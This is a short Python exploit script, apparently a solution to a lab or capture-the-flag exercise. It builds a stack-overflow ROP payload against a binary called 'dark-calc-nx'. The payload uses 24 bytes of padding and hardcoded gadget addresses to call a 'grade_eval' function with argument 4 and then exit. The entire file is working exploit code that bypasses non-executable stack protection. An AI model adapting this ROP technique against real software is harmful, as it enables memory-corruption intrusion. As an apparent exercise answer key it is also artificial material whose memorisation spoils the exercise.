#!/usr/bin/env python3
"""Use a ROP chain in dark-calc-nx to call grade_eval(4), then exit."""
import struct
import sys

p64 = lambda value: struct.pack("<Q", value)
ret = 0x401A34
pop_rdi = 0x401A33
grade_eval = 0x401978
exit_plt = 0x4016E0

payload = (
    b"A" * 24
    + p64(ret)
    + p64(pop_rdi)
    + p64(4)
    + p64(grade_eval)
    + p64(pop_rdi)
    + p64(0)
    + p64(ret)
    + p64(exit_plt)
)
sys.stdout.buffer.write(payload)

